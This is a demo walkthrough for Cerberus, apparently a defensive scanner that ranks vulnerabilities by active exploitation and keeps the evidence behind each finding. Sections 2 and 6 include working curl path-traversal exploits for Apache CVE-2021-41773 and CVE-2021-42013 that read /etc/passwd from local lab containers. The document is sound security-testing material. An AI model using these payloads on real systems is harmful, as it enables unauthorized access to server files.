# Demo script

A ~10 minute walkthrough that shows what Cerberus does and, deliberately, where it is honest about
its limits. Every command and output quoted here is real, from a run against the [Docker lab](../lab/README.md).

The story is one sentence: **rank what attackers are actually exploiting, and show the evidence.**

## Before you start (do this ahead of time, not live)

A full `safe`-profile scan takes about 14 minutes at the profile's 20 requests/second limit, so run
it beforehand and demo against the results.

```bash
docker compose -f lab/docker-compose.yml up -d
export DATABASE_URL="sqlite:///$PWD/lab.db"

python scripts/init_db.py
python scripts/refresh_enrichment.py                       # KEV + EPSS, ~1,700 CVEs
python cerberus.py scan --target 127.0.0.1 --authorized --allow-private \
    --no-subdomains --ports 18081,18082                    # ~14 min

# then, in two terminals
uvicorn api.main:app --port 8000                           # reads API_SECRET_KEY from .env
cd frontend && npm run dev                                 # http://localhost:5173
```

Create an account in the dashboard, then give it the scan you just ran (it was run from the CLI, so it
has no owner yet):

```bash
python scripts/claim_legacy.py you@example.com
```

## 1. The problem (1 minute)

> "A scanner gives you thousands of findings sorted by CVSS. But a 9.8 nobody exploits is not your
> biggest problem, and a 7.5 under active attack might be."

Have the ranked list ready (Findings tab, or `python cerberus.py report --top 10`).

## 2. The target is real (1 minute)

The lab is real vulnerable software, not a stub imitating a banner.

```bash
docker ps --filter label=cerberus.lab=true --format "{{.Names}}  {{.Ports}}"
curl -s --path-as-is "http://127.0.0.1:18081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -1
# root:x:0:0:root:/root:/bin/bash
```

> "That is CVE-2021-41773 working against Apache 2.4.49. Both containers bind to loopback only."

## 3. Guardrails come first (2 minutes)

Cerberus does active reconnaissance, so what it refuses to do matters as much as what it does.

```bash
# No authorization attestation -> refused
python cerberus.py scan --target 127.0.0.1 --no-subdomains
# refused: Scanning requires an explicit authorization attestation. See docs/RULES_OF_ENGAGEMENT.md.

# Private addresses are out of scope unless the operator opts in
python cerberus.py scan --target 127.0.0.1 --authorized --no-subdomains
# no in-scope hosts resolved for 127.0.0.1
# done: 0 assets, 0 findings, 0 scored

# An intrusive profile must be asked for explicitly
python cerberus.py scan --target example.com --authorized --profile thorough
# refused: scan profile 'thorough' is more intrusive than the default and must be requested explicitly
```

Then show the safety floor. No profile can enable destructive templates:

```bash
python - << 'EOF'
from core.profiles import SAFE, ScanProfile, ProfileViolation
print(" ".join(SAFE.nuclei_args()))          # the exact nuclei flags, allowlisted
try:
    ScanProfile(name="x", description="", allowed_tags=frozenset({"cve", "dos"}),
                allowed_protocols=frozenset({"http"}), severities=("high",))
except ProfileViolation as e:
    print("refused:", e)
EOF
```

> "Template selection is an allowlist, not 'everything minus a few'. Denial-of-service, fuzzing,
> brute force, and templates that run local code are refused by every profile, and re-checked at
> three layers, because a template can carry several tags."

## 4. The ranking (2 minutes)

Dashboard, **Findings** tab. Point at:

- The top rows are **KEV-listed** (CISA confirms active exploitation) with ~100% EPSS. Point at the
  inversion: `CVE-2024-38475` (CVSS **9.1**, KEV) scores 83.1, above `CVE-2021-44790` (CVSS **9.8**,
  not KEV) at 61.8. Sorting by CVSS would put them the other way round.
- Each row's **reasoning** says why it ranks where it does, in plain English.
- The **confirmed / inferred** badge. Click `CVE-2021-41773` on port 18081: it is *confirmed*, with
  the nuclei template and the URL it matched at.

## 5. The evidence chain (2 minutes)

Dashboard, **Evidence** tab. Every finding traces to raw, tool-attributed output recorded *before*
normalization: which tool (`nmap`, `nuclei`, `tcp_connect`), which version of it, what it saw.

> "An asset row says what Cerberus concluded. These rows say what a tool actually saw."

## 6. The honest part (1 minute) - don't skip this

Two kinds of evidence, kept separate on purpose:

| | What it means |
|---|---|
| `version_inference` | The service reports a version NVD lists as affected. A claim about the version. |
| `active_detection` | A probe matched against the host. |

On the lab, `CVE-2021-42013` is exploitable on **both** containers:

```bash
for port in 18081 18082; do
  curl -s --path-as-is "http://127.0.0.1:$port/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" | head -1
done
# root:x:0:0:root:/root:/bin/bash    <- 2.4.49
# root:x:0:0:root:/root:/bin/bash    <- 2.4.50
```

Yet nuclei's template did not confirm it on either. Version inference flagged it correctly. So `version_inference` does not mean "unconfirmed, probably false": here it was
a true positive that the probe missed.

> "Neither signal is enough alone, so Cerberus keeps both and says which is which."

## What Cerberus does not do (say this before you're asked)

- It does **not** exploit anything. It reports what could be exploited.
- Findings are only as good as the fingerprint: an unidentified service produces no CVEs at all.
- CPE matching is version-string based; distro back-ported patches can make it over-report.
- One scan runs at a time, inside the API process, and does not survive a restart.
- Levels 1 and 2 of testing are done (this lab, and `scanme.nmap.org`). It has **not** yet been run
  against a realistic multi-service cloud environment.

## If something goes wrong

| Symptom | Likely cause |
|---|---|
| Dashboard shows a red "enrichment cache is empty" banner | Run `python scripts/refresh_enrichment.py` |
| The dashboard shows nothing after signing in | The CLI scan has no owner; run `python scripts/claim_legacy.py <your email>` |
| Signed out unexpectedly | `API_SECRET_KEY` changed since you signed in — that invalidates every token |
| API refuses to start | `API_SECRET_KEY` is unset or the `change-me` placeholder |
| `0 assets` after a scan | `--allow-private` missing (lab), or `--ports` doesn't include the lab ports |
| Lab scan is slow | Expected: 20 req/s by design. Use the pre-recorded `lab.db` |
